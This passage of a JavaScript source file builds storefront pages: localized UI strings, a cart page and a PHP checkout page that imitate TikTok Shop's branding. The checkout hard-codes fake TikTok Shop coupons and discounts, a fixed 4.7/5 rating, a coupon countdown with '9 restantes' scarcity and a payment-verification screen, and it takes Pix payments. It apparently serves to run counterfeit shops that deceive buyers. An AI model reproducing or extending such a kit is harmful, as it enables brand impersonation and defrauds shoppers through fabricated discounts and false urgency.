        visit_store: "Visiter",
        footer_icon_store: "Boutique",
        footer_icon_chat: "Chat",
        label_email: "Email :",
        label_whatsapp: "WhatsApp :",
        label_address: "Adresse :",
        label_cnpj: "N° TVA :",
        label_business_name: "Raison sociale :",
        footer_rights: "Tous droits réservés",
        label_qty: "Quantité"
    },
    de: {
        search_placeholder: "Suchen",
        nav_home: "Übersicht", nav_products: "Produkte", nav_categories: "Kategorien",
        filters: ["Empfohlen", "Bestseller", "Neuheiten"],
        discount_off: "RABATT",
        free_shipping: "Kostenloser Versand",
        sold_count: "verkauft",
        btn_buy: "Jetzt kaufen",
        btn_buy2: "Mit Gutschein kaufen",
        btn_add_cart: "Zum Warenkorb<br>hinzufügen",
        shipping_title: "Lieferung bis",
        shipping_fee: "Versandkosten",
        returns_policy: "Kostenlose 30-Tage-Rückgabe • Einfache Stornierung",
        select_options: "Optionen wählen",
        reviews_title: "Bewertungen",
        reviews_title2: "Kundenbewertungen",
        view_more: "Mehr anzeigen",
        description_title: "Beschreibung",
        recommendations_title: "Empfehlungen",
        recommendations_title2: "Das könnte Ihnen auch gefallen",
        footer_institutional: "Unternehmen", footer_help: "Kundenservice", footer_about: "Über uns",
        footer_links: ["Datenschutz", "Umtausch und Rückgabe", "Versandrichtlinie", "Nutzungsbedingungen"],
        flash_deal: "Blitzangebot",
        ends_in: "Endet in",
        visit_store: "Besuchen",
        footer_icon_store: "Shop",
        footer_icon_chat: "Chat",
        label_email: "E-Mail:",
        label_whatsapp: "WhatsApp:",
        label_address: "Adresse:",
        label_cnpj: "Steuer-ID:",
        label_business_name: "Firmenname:",
        footer_rights: "Alle Rechte vorbehalten",
        label_qty: "Menge" // NOVA CHAVE
    }
};

const CURRENCY_CONFIG = {
    pt: { symbol: "R$", locale: "pt-BR", shippingCost: "6,90" },
    "pt-pt": { symbol: "€", locale: "pt-PT", shippingCost: "4,90" },
    en: { symbol: "$", locale: "en-US", shippingCost: "4.90" },
    es: { symbol: "€", locale: "es-ES", shippingCost: "4,90" },
    fr: { symbol: "€", locale: "fr-FR", shippingCost: "4,90" },
    de: { symbol: "€", locale: "de-DE", shippingCost: "4,90" }
};

// ============================================================================
// ===================== TEMPLATES DOS ARQUIVOS GERADOS =======================
// ============================================================================

const CART_TEMPLATE = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Seu Carrinho</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif; }
        body { background-color:#f5f5f5; color:#111; max-width:500px; margin:0 auto; padding-top: 60px; padding-bottom: 80px; min-height: 100vh; }
        .cart-header { position:fixed; top:0; left:0; right:0; max-width:500px; margin:0 auto; height:52px; background:white; display:flex; align-items:center; padding:0 16px; font-weight:600; font-size:18px; z-index:151; border-bottom:1px solid #eee; }
        .cart-back-btn { margin-right:16px; font-size:24px; cursor:pointer; display:flex; align-items:center; }
        #cart-items-list { padding: 10px 0; }
        .cart-item { background:white; margin:10px 16px; padding:12px; border-radius:8px; display:flex; gap:12px; align-items:center; box-shadow: 0 1px 2px rgba(0,0,0,0.05); }
        .cart-check { width:20px; height:20px; border:2px solid #ccc; border-radius:50%; display:flex; align-items:center; justify-content:center; cursor:pointer; color:white; font-size:12px; flex-shrink: 0; }
        .cart-check.checked { background:#fe2c55; border-color:#fe2c55; }
        .cart-img { width:80px; height:80px; object-fit:cover; border-radius:4px; background:#eee; flex-shrink: 0; }
        .cart-info { flex:1; min-width: 0; }
        .cart-title { font-size:13px; display:-webkit-box; -webkit-line-clamp:2; -webkit-box-orient:vertical; overflow:hidden; line-height:1.3; margin-bottom:4px; font-weight: 500; }
        .cart-variant { background:#f5f5f5; display:inline-block; padding:2px 6px; font-size:11px; color:#666; border-radius:4px; margin-bottom:6px; }
        .cart-price-row { display:flex; justify-content:space-between; align-items:center; margin-top: 5px; }
        .cart-price { color:#fe2c55; font-weight:700; font-size: 15px; }
        .cart-qty-control { display:flex; border:1px solid #ddd; border-radius:4px; height: 24px; align-items: center; }
        .cart-qty-control button { width:24px; height:100%; display: flex; align-items: center; justify-content: center; font-size: 16px; color: #333; cursor: pointer; border: none; background: transparent; }
        .cart-qty-control span { width:30px; display:flex; align-items:center; justify-content:center; font-size:12px; font-weight: 600; }
        .cart-footer { position:fixed; bottom:0; left:0; right:0; max-width:500px; margin:0 auto; background:white; padding:12px 16px; border-top:1px solid #eee; display:flex; justify-content:space-between; align-items:center; z-index:152; box-shadow: 0 -2px 10px rgba(0,0,0,0.05); }
        .cart-total-label { font-size:12px; color:#666; }
        .cart-total-val { color:#fe2c55; font-weight:700; font-size:18px; }
        .cart-checkout-btn { background:#fe2c55; color:white; padding:12px 24px; border-radius:30px; font-weight:600; font-size:15px; border: none; cursor: pointer; }
        .empty-cart { text-align: center; padding: 40px 20px; color: #999; }
        .empty-cart svg { width: 60px; height: 60px; margin-bottom: 15px; stroke: #ddd; }
    </style>
</head>
<body>
    <div class="cart-header">
        <div class="cart-back-btn" onclick="goBack()"><svg width="24" height="24" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M15 19l-7-7 7-7"></path></svg></div>
        <div>Carrinho (<span id="header-count">0</span>)</div>
    </div>
    <div id="cart-items-list"></div>
    <div class="cart-footer">
        <div><div class="cart-total-label">Total</div><div class="cart-total-val">R$ <span id="cart-total">0,00</span></div></div>
        <button class="cart-checkout-btn" onclick="checkoutCart()">Finalizar compra (<span id="cart-count-btn">0</span>)</button>
    </div>
    <script>
        const STORAGE_KEY = 'tktk_cart_items';
        let cartItems = [];
        function loadCart() { const stored = localStorage.getItem(STORAGE_KEY); cartItems = stored ? JSON.parse(stored) : []; renderCart(); }
        function goBack() { if(document.referrer) { window.history.back(); } else { window.location.href = 'index.php'; } }
        function saveCart() { localStorage.setItem(STORAGE_KEY, JSON.stringify(cartItems)); renderCart(); }
        function renderCart() {
            const list = document.getElementById('cart-items-list'); const headerCount = document.getElementById('header-count'); const footerCount = document.getElementById('cart-count-btn'); const footerTotal = document.getElementById('cart-total');
            list.innerHTML = '';
            if (cartItems.length === 0) {
                list.innerHTML = \`<div class="empty-cart"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="9" cy="21" r="1"></circle><circle cx="20" cy="21" r="1"></circle><path d="M1 1h4l2.68 13.39a2 2 0 0 0 2 1.61h9.72a2 2 0 0 0 2-1.61L23 6H6"></path></svg><p>Seu carrinho está vazio</p></div>\`;
                headerCount.textContent = '0'; footerCount.textContent = '0'; footerTotal.textContent = '0,00'; return;
            }
            let total = 0; let selectedCount = 0;
            cartItems.forEach((item, idx) => {
                let p = 0;
                let pStr = String(item.price);
                if (pStr.includes(',') && pStr.includes('.')) p = parseFloat(pStr.replace('R$', '').replace(/\./g, '').replace(',', '.'));
                else if (pStr.includes(',')) p = parseFloat(pStr.replace('R$', '').replace(',', '.'));
                else p = parseFloat(pStr.replace('R$', ''));
                if(isNaN(p)) p = 0;

                if(item.selected) { total += p * item.qty; selectedCount++; }
                const html = \`<div class="cart-item"><div class="cart-check \${item.selected ? 'checked' : ''}" onclick="toggleItem(\${idx})">\${item.selected ? '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="4" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>' : ''}</div><img src="\${item.image}" class="cart-img"><div class="cart-info"><div class="cart-title">\${item.title}</div><div class="cart-variant">\${item.color ? item.color : ''}\${item.size ? (item.color ? ' / ' : '') + item.size : ''}</div><div class="cart-price-row"><div class="cart-price">R$ \${item.price}</div><div class="cart-qty-control"><button onclick="changeCartQty(\${idx}, -1)">-</button><span>\${item.qty}</span><button onclick="changeCartQty(\${idx}, 1)">+</button></div></div></div></div>\`;
                list.innerHTML += html;
            });
            headerCount.textContent = cartItems.length; footerCount.textContent = selectedCount; footerTotal.textContent = total.toLocaleString('pt-BR', {minimumFractionDigits: 2});
        }
        window.toggleItem = function(idx) { cartItems[idx].selected = !cartItems[idx].selected; saveCart(); };
        window.changeCartQty = function(idx, delta) { cartItems[idx].qty += delta; if(cartItems[idx].qty < 1) { if(confirm("Remover item do carrinho?")) { cartItems.splice(idx, 1); } else { cartItems[idx].qty = 1; } } saveCart(); };
        window.checkoutCart = function() {
            const selected = cartItems.filter(i => i.selected);
            if(selected.length === 0) return alert("Selecione pelo menos um item.");
            
            let total = 0;
            selected.forEach(item => {
                let p = 0;
                let pStr = String(item.price);
                if (pStr.includes(',') && pStr.includes('.')) p = parseFloat(pStr.replace('R$', '').replace(/\./g, '').replace(',', '.'));
                else if (pStr.includes(',')) p = parseFloat(pStr.replace('R$', '').replace(',', '.'));
                else p = parseFloat(pStr.replace('R$', ''));
                if(!isNaN(p)) total += p * item.qty;
            });

            const url = new URL('checkout.php', window.location.href); 
            url.searchParams.append('produto', selected.length > 1 ? 'Pedido (' + selected.length + ' itens)' : selected[0].title);
            url.searchParams.append('preco', total.toFixed(2).replace('.', ','));
            url.searchParams.append('imagem', selected[0].image);
            url.searchParams.append('quantidade', 1);
            const itemsData = JSON.stringify(selected.map(i => ({ 
                title: i.title, 
                price: i.price, 
                image: i.image, 
                qty: i.qty, 
                storeName: i.storeName,
                variant: (i.color ? i.color : '') + (i.size ? ' ' + i.size : '') 
            })));
            url.searchParams.append('items_data', encodeURIComponent(itemsData));
            window.location.href = url.toString();
        };
        loadCart();
    </script>
</body>
</html>`;

// 2. Modelo do Checkout.php (V1 - Padrão - CORRIGIDO V3.1: Escopo de Variável)
const CHECKOUT_TEMPLATE = `<?php
date_default_timezone_set('America/Sao_Paulo');
$meses = ['Jan' => 'jan', 'Feb' => 'fev', 'Mar' => 'mar', 'Apr' => 'abr', 'May' => 'mai', 'Jun' => 'jun', 'Jul' => 'jul', 'Aug' => 'ago', 'Sep' => 'set', 'Oct' => 'out', 'Nov' => 'nov', 'Dec' => 'dez'];
$dataInicio = strtotime('+4 days');
$dataFim = strtotime('+11 days');
$prazoEntrega = date('j', $dataInicio) . " de " . $meses[date('M', $dataInicio)] . " - " . date('j', $dataFim) . " de " . $meses[date('M', $dataFim)];
$prazoPagamento = date('H:i') . ", " . date('j') . " de " . $meses[date('M')] . " " . date('Y');


$itemsData = null;
if (isset($_GET['items_data'])) {
    $decoded = json_decode(urldecode($_GET['items_data']), true);
    if (json_last_error() === JSON_ERROR_NONE && is_array($decoded)) $itemsData = $decoded;
}
if (!$itemsData) {
    $itemsData = [[
        'title' => isset($_GET['produto']) ? htmlspecialchars($_GET['produto']) : 'Produto',
        'price' => isset($_GET['preco']) ? $_GET['preco'] : '146,17',
        'image' => isset($_GET['imagem']) ? $_GET['imagem'] : 'https://placehold.co/200x200',
        'qty' => isset($_GET['quantidade']) ? (int)$_GET['quantidade'] : 1,
        'variant' => 'Padrão'
    ]];
}
?>

<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Checkout Seguro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <script>
        tailwind.config = { theme: { fontFamily: { sans: ['Inter', 'sans-serif'] }, extend: { colors: { tiktok: '#fe2c55', textDark: '#161823', greenTrust: '#00c0a8', bgGray: '#f1f1f2', inputGray: '#f8f8f8', borderLight: '#e5e7eb' } } } }
    </script>
    <style>
        body { background-color: #f1f1f2; -webkit-tap-highlight-color: transparent; }
        .hidden-screen { display: none !important; }
        .loader { border: 3px solid #f3f3f3; border-radius: 50%; border-top: 3px solid #fe2c55; width: 20px; height: 20px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .tt-loader { position: relative; width: 40px; height: 18px; }
        .tt-loader .tt-dot { position: absolute; top: 1px; width: 16px; height: 16px; border-radius: 50%; mix-blend-mode: multiply; }
        .tt-loader .tt-dot.red { left: 2px; background: #fe2c55; animation: ttMoveR 0.55s infinite alternate ease-in-out; }
        .tt-loader .tt-dot.cyan { right: 2px; background: #25f4ee; animation: ttMoveC 0.55s infinite alternate ease-in-out; }
        @keyframes ttMoveR { from { transform: translateX(0); } to { transform: translateX(8px); } }
        @keyframes ttMoveC { from { transform: translateX(0); } to { transform: translateX(-8px); } }
        .tt-loader-dark .tt-dot { mix-blend-mode: screen; }
        .rainbow-line { height: 3px; width: 100%; background: repeating-linear-gradient(90deg, #ff0050 0, #ff0050 12px, transparent 12px, transparent 16px, #25f4ee 16px, #25f4ee 28px, transparent 28px, transparent 32px); }
        .radio-pix { appearance: none; width: 20px; height: 20px; border: 2px solid #ddd; border-radius: 50%; outline: none; position: relative; }
        .radio-pix:checked { border-color: #fe2c55; }
        .radio-pix:checked::after { content: ''; position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 10px; height: 10px; background: #fe2c55; border-radius: 50%; }
        .qty-box { border: 1px solid #e6e6e6; border-radius: 4px; display: flex; align-items: center; background: white; height: 32px; }
        .qty-btn { width: 32px; height: 100%; display: flex; align-items: center; justify-content: center; color: #161823; font-size: 18px; cursor: pointer; }
        .qty-val { padding: 0 12px; font-size: 14px; font-weight: 500; border-left: 1px solid #e6e6e6; border-right: 1px solid #e6e6e6; height: 100%; display: flex; align-items: center; }
        .addr-input { width: 100%; padding: 14px 0; border-bottom: 1px solid #e5e7eb; background: transparent; font-size: 15px; outline: none; color: #161823; border: none; }
        .addr-input::placeholder { color: #b0b0b4; font-weight: 400; }
        .addr-input:focus { border-bottom-color: #161823; }
        select.addr-input { -webkit-appearance: none; -moz-appearance: none; appearance: none; background-color: transparent; }
        .addr-section-title { font-size: 13px; color: #757575; margin-top: 20px; margin-bottom: 8px; font-weight: 400; }
        .addr-input-group { background: transparent; border-bottom: 1px solid #e5e7eb; margin-bottom: 0; }
        .field-control-wrapper { position: absolute; opacity: 0; z-index: -100; left: -9999px; }
        @keyframes fadeInScale { from { opacity: 0; transform: scale(0.95); } to { opacity: 1; transform: scale(1); } }
        .animate-pop { animation: fadeInScale 0.2s cubic-bezier(0.16, 1, 0.3, 1); }
        .checkmark-circle { width: 50px; height: 50px; border-radius: 50%; display: block; stroke-width: 2; stroke: #fff; stroke-miterlimit: 10; margin: 10% auto; box-shadow: inset 0px 0px 0px #00c0a8; animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s both; background: #00c0a8; display:flex; align-items:center; justify-content:center;}
        .checkmark-check { transform-origin: 50% 50%; stroke-dasharray: 48; stroke-dashoffset: 48; animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards; }
        @keyframes stroke { 100% { stroke-dashoffset: 0; } }
        @keyframes scale { 0%, 100% { transform: none; } 50% { transform: scale3d(1.1, 1.1, 1); } }
    </style>
</head>
<body class="pb-40">
    <div class="field-control-wrapper"><label for="website-control">Website</label><input type="text" id="website-control" name="website" tabindex="-1" autocomplete="off"></div>
    <div id="loading-dark" class="hidden-screen fixed inset-0 z-[300] flex items-center justify-center bg-black/25">
        <div class="bg-[#3c3c3c] rounded-2xl px-10 py-7 flex flex-col items-center gap-4 shadow-xl">
            <div class="tt-loader tt-loader-dark"><div class="tt-dot red"></div><div class="tt-dot cyan"></div></div>
            <span class="text-white text-[14px]">Carregando...</span>
        </div>
    </div>
    <div id="loading-white" class="hidden-screen fixed inset-0 z-[300] flex items-center justify-center bg-white">
        <div class="tt-loader"><div class="tt-dot red"></div><div class="tt-dot cyan"></div></div>
    </div>
    <div id="screen-checkout">
        <header class="bg-white sticky top-0 z-40 border-b border-gray-200">
            <div class="flex items-center justify-between px-4 h-14">
                <button onclick="history.back()" class="p-1 -ml-2"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 18l-6-6 6-6" stroke-linecap="round" stroke-linejoin="round"/></svg></button>
                <div class="flex items-center gap-1.5"><svg width="16" height="16" viewBox="0 0 24 24" fill="#fbbf24"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg><span class="font-bold text-[16px] text-textDark">Ótima avaliação! 4.7/5,0</span></div><div class="w-6"></div>
            </div>
        </header>
        <div class="bg-white mt-2">
            <div id="btn-add-address-container" class="border-b border-gray-100">
                <button onclick="openAddressScreen()" class="w-full px-4 py-4 flex items-center justify-between bg-white active:bg-gray-50"><span class="text-[14px] flex items-center gap-2 font-medium text-textDark"><span class="text-[18px] font-light text-[#fe2c55]">+</span>Adicionar endereço de entrega</span><svg class="text-gray-400" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg></button>
            </div>
            <div id="address-display-container" class="hidden pt-3 pb-4 px-4 cursor-pointer border-b border-gray-100 hover:bg-gray-50" onclick="openAddressScreen()">
                <div class="flex items-start gap-2 text-[13px]"><div class="mt-0.5 text-textDark"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg></div><div class="flex-1"><div class="font-bold text-textDark flex gap-2 items-center"><span id="disp-name">Nome</span>, <span class="text-gray-500 font-normal" id="disp-phone">Tel</span></div><div class="text-textDark leading-snug mt-1" id="disp-full">Endereço completo</div></div><svg class="text-gray-400 mt-1" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg></div><div class="bg-[#f2f2f2] rounded-md p-3 mt-3 text-[13px] text-gray-600">Verifique seu endereço antes de fazer o pedido</div>
            </div>
        </div>
        <div class="bg-white"><div id="btn-add-cpf-container"><button onclick="toggleCPFForm()" class="w-full px-4 py-4 flex items-center justify-between bg-white active:bg-gray-50"><span class="text-[14px] flex items-center gap-2 font-medium text-textDark"><span class="text-[18px] font-light text-[#fe2c55]">+</span>Adicionar CPF (opcional)</span><svg class="text-gray-400" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg></button></div><div id="cpf-form-container" class="hidden px-4 pb-4"><label class="text-xs text-gray-500 mb-1 block">CPF:</label><input type="text" id="chk-cpf" class="w-full border border-gray-300 rounded p-2 text-sm bg-white outline-none focus:border-black" placeholder="000.000.000-00" oninput="maskCPF(this)"></div></div>
        <div class="rainbow-line mt-2"></div>
        <div class="bg-white px-4 py-3 flex justify-between items-center border-b border-gray-100"><div class="flex items-center gap-2"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#fe2c55" stroke-width="2"><path d="M19 4H5a2 2 0 0 0-2 2v12a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/><path d="M9 12l2 2 4-4"/></svg><span class="font-bold text-[14px] text-textDark">Desconto do TikTok Shop</span></div><div class="flex items-center gap-2"><div class="flex flex-col items-end"><span class="bg-cyan-50 text-cyan-500 text-[10px] font-bold px-1.5 py-0.5 rounded">- R$ 40,00</span><span class="bg-[#fff2f5] text-[#fe2c55] text-[10px] font-bold px-1.5 py-0.5 rounded mt-1">- R$ 35,00</span></div><svg class="text-gray-400" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg></div></div>
        <div id="products-list" class="bg-white border-t border-gray-100"></div>
        <div class="bg-white mt-2 p-4"><h3 class="font-bold text-[15px] mb-4 text-textDark">Resumo do pedido</h3><div class="flex justify-between text-[14px] mb-2"><span class="text-textDark font-medium flex items-center gap-1">Subtotal do produto <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 15l-6-6-6 6"/></svg></span><span class="text-textDark font-medium">R$ <span id="summary-subtotal">0,00</span></span></div><div class="pl-0 mb-4 space-y-2"><div class="flex justify-between text-[13px] text-gray-500"><span class="ml-4">Preço original</span><span>R$ <span id="summary-original">0,00</span></span></div><div class="flex justify-between text-[13px] text-gray-500"><span class="ml-4">Desconto no produto</span><span class="text-[#fe2c55]">- R$ <span id="summary-disc-prod">0,00</span></span></div><div class="flex justify-between text-[13px] text-gray-500"><span class="ml-4">Cupons de vendedor</span><span class="text-[#fe2c55]">- R$ 17,50</span></div><div class="flex justify-between text-[13px] text-gray-500"><span class="ml-4">Cupons do TikTok Shop</span><span class="text-[#fe2c55]">- R$ 17,50</span></div></div><div class="flex justify-between text-[14px] mb-2"><span class="text-textDark font-medium flex items-center gap-1">Subtotal do envio <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 15l-6-6-6 6"/></svg></span><span class="text-textDark font-medium">R$ <span id="summary-shipping-subtotal">30,30</span></span></div><div class="pl-0 mb-6 space-y-2"><div class="flex justify-between text-[13px] text-gray-500"><span class="ml-4">Taxa de envio</span><span>R$ <span id="summary-shipping-fee">70,30</span></span></div><div class="flex justify-between text-[13px] text-gray-500"><span class="ml-4">Desconto de envio</span><span class="text-[#fe2c55]">- R$ 40,00</span></div></div><div class="flex justify-between items-start mb-1"><span class="font-bold text-[16px] text-textDark">Total</span><div class="text-right"><span class="font-bold text-[16px] text-textDark">R$ <span id="summary-total">0,00</span></span><p class="text-[11px] text-gray-400 mt-0.5">Impostos inclusos</p></div></div></div>
        <div class="h-2 bg-bgGray"></div>
        <div class="bg-white p-4"><h3 class="font-bold text-[14px] mb-3 text-textDark">Forma de pagamento</h3>
            <div id="payment-pix-option" class="flex justify-between items-center py-3 border-b border-gray-100 cursor-pointer" onclick="selectPaymentMethod('pix')"><div class="flex items-center gap-3"><div class="w-6 h-6 flex items-center justify-center"><img src="https://editor.sys-assets-check.com/img/pix.png" alt="Pix" class="w-full h-full object-contain"></div><span class="text-[14px] font-medium text-textDark">Pix</span></div><div class="w-5 h-5 rounded-full border-2 border-gray-300 flex items-center justify-center" id="radio-pix-circle"><div class="w-2.5 h-2.5 rounded-full bg-[#32BCAD]"></div></div></div>
            <div id="payment-card-option" class="flex justify-between items-center py-3 cursor-pointer" onclick="selectPaymentMethod('card')"><div class="flex items-center gap-3"><span class="text-[18px] font-light text-gray-400">+</span><div class="flex flex-col"><span class="text-[14px] font-medium text-textDark">Cartao de credito</span><div class="flex items-center gap-1.5 mt-1"><svg width="26" height="16" viewBox="0 0 36 24"><circle cx="12" cy="12" r="10" fill="#EB001B"/><circle cx="24" cy="12" r="10" fill="#F79E1B"/><path d="M18 4.5a9.9 9.9 0 0 0-3.5 7.5c0 3 1.3 5.7 3.5 7.5a9.9 9.9 0 0 0 3.5-7.5c0-3-1.3-5.7-3.5-7.5z" fill="#FF5F00"/></svg><svg width="40" height="14" viewBox="0 0 100 32"><path d="M38.3 0L24.8 32h-9.7L8.4 6.4c-.4-1.5-.7-2-1.9-2.6C4.2 2.8 1.5 1.9 0 1.4l.3-1.4h15.6c2 0 3.8 1.3 4.2 3.6l3.9 20.5L35 0h3.3zm12.2 0l-7.6 32h-9L41.4 0h9.1zm28.9 21.5c0-8.4-11.6-8.9-11.5-12.6 0-1.1 1.1-2.3 3.5-2.6 1.2-.2 4.4-.3 8.1 1.5l1.4-6.7C79.3.5 77.3 0 74.8 0c-8.7 0-14.9 4.6-14.9 11.3 0 4.9 4.4 7.7 7.8 9.3 3.5 1.7 4.6 2.8 4.6 4.3 0 2.3-2.8 3.4-5.3 3.4-4.5.1-7.1-1.2-9.2-2.2l-1.6 7.5c2.1 1 6 1.8 10 1.9 9.3 0 15.4-4.6 15.4-11.7zm23 10.5h8.1L103.6 0h-7.5c-1.7 0-3.1 1-3.7 2.5L81.7 32h9.3l1.8-5.1h11.4l1.1 5.1z" fill="#1A1F71"/></svg><svg width="30" height="12" viewBox="0 0 60 24"><rect width="60" height="24" rx="3" fill="#FFCB05"/><text x="30" y="17" font-size="14" font-weight="bold" text-anchor="middle" fill="#000">elo</text></svg><svg width="28" height="18" viewBox="0 0 40 26"><rect width="40" height="26" rx="3" fill="#016FD0"/><text x="20" y="18" font-size="9" font-weight="bold" text-anchor="middle" fill="#fff">AMEX</text></svg></div><span class="text-[11px] text-gray-500 mt-0.5">Pague em ate 11 parcelas</span></div></div><svg class="text-gray-400" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 18l6-6-6-6"/></svg></div>
        </div>
        <div class="bg-[#fff2f5] p-3 flex items-center gap-2 mt-2 mb-4 border-t border-b border-[#ffd6de]"><div class="text-[#fe2c55]"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M8 14s1.5 2 4 2 4-2 4-2"/><line x1="9" y1="9" x2="9.01" y2="9"/><line x1="15" y1="9" x2="15.01" y2="9"/></svg></div><span class="text-[#fe2c55] text-[12px] font-medium">Você está economizando R$ <span id="total-savings">0,00</span> nesse pedido.</span></div>
        <div class="fixed bottom-0 left-0 w-full bg-white border-t border-gray-200 p-4 pb-8 z-40"><div class="flex justify-between items-center mb-3"><span class="text-[14px] font-bold text-textDark">Total (<span id="items-count">1</span> item)</span><span class="text-[#fe2c55] font-bold text-[16px]">R$ <span id="footer-total">0,00</span></span></div><button onclick="processPayment()" id="btn-pay" class="w-full bg-[#fe2c55] text-white font-bold py-3 rounded-[4px] flex flex-col items-center justify-center h-12 active:opacity-90 transition-all shadow-sm"><span class="text-[16px]">Fazer pedido</span><span class="text-[10px] font-normal opacity-90">O cupom expira em <span id="countdown">00:53:03</span> | 9 restantes</span></button></div>
    </div>
    <div id="modal-req-addr" class="hidden-screen fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-pop">
        <div class="bg-white w-full max-w-[320px] rounded-2xl p-6 text-center shadow-xl relative">
            <div class="w-16 h-16 bg-[#fe2c55]/10 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#fe2c55" stroke-width="2.5"><path d="M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0 1 18 0z"/><circle cx="12" cy="10" r="3"/></svg>
            </div>
            <h3 class="text-[18px] font-bold text-textDark mb-2">Endereço necessário</h3>
       <p class="text-[14px] text-gray-500 mb-6 leading-relaxed">Por favor preencha o endereço para finalizar sua compra.</p>
       <button onclick="closeReqAddr()" class="w-full bg-[#fe2c55] text-white font-bold py-3.5 rounded-xl text-[16px] shadow-sm active:scale-95 transition-transform">Preencher agora</button>
        </div>
    </div>
    <div id="modal-tracking-warning" class="hidden-screen fixed inset-0 z-[100] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4 animate-pop">
        <div class="bg-white w-full max-w-[320px] rounded-2xl p-6 text-center shadow-xl relative">
            <div class="w-16 h-16 bg-[#fe2c55]/10 rounded-full flex items-center justify-center mx-auto mb-4">
                <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#fe2c55" stroke-width="2.5"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
            </div>
            <h3 class="text-[18px] font-bold text-textDark mb-2">Pedido em espera</h3>
            <p class="text-[14px] text-gray-500 mb-6 leading-relaxed">Por favor finalize o pagamento para receber seu código de rastreio.</p>
            <button onclick="closeTrackingModal()" class="w-full bg-white border border-gray-200 text-textDark font-bold py-3.5 rounded-xl text-[16px] shadow-sm active:scale-95 transition-transform">Fechar</button>
        </div>
    </div>
    <div id="modal-upsell-redirect" class="hidden-screen fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4 animate-pop">
        <div class="bg-white w-full max-w-[320px] rounded-2xl p-6 text-center shadow-xl relative">
            <div id="upsell-status-icon"><div class="loader mx-auto" style="width:40px; height:40px; border-width:4px;"></div></div>
            <h3 id="upsell-status-title" class="text-[18px] font-bold text-textDark mb-2 mt-4">Verificando pagamento...</h3>
            <p id="upsell-status-desc" class="text-[14px] text-gray-500 mb-6 leading-relaxed">Aguarde enquanto confirmamos sua transação no banco.</p>
        </div>
    </div>
    <div id="screen-address-overlay" class="hidden-screen fixed inset-0 z-50 bg-white overflow-y-auto animate-fade-in">
        <header class="bg-white px-4 py-4 flex items-center justify-between sticky top-0 z-10"><button onclick="closeAddressScreen()" class="p-2 -ml-2"><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg></button><h1 class="font-bold text-[17px] text-textDark">Adicionar o novo endereço</h1><div class="w-8"></div></header>
        <form id="full-address-form" onsubmit="saveAddressOverlay(event)" class="px-4 pb-32 pt-2">
            <p class="addr-section-title">Informações de contato</p>
            <div class="addr-input-group"><input type="text" name="name" id="ov-name" placeholder="Nome e sobrenome" class="addr-input" required></div>
            <div class="flex items-center border-b border-gray-200"><span class="text-[15px] text-gray-900 mr-3 py-3 min-w-[60px]">BR +55</span><div class="h-6 w-[1px] bg-gray-200 mx-2"></div><input type="tel" name="phone" id="ov-phone" placeholder="Número de telefone" class="w-full py-3 bg-transparent text-[15px] outline-none" required></div>
            <div class="addr-input-group"><input type="email" name="email" id="ov-email" placeholder="E-mail" class="addr-input"></div>
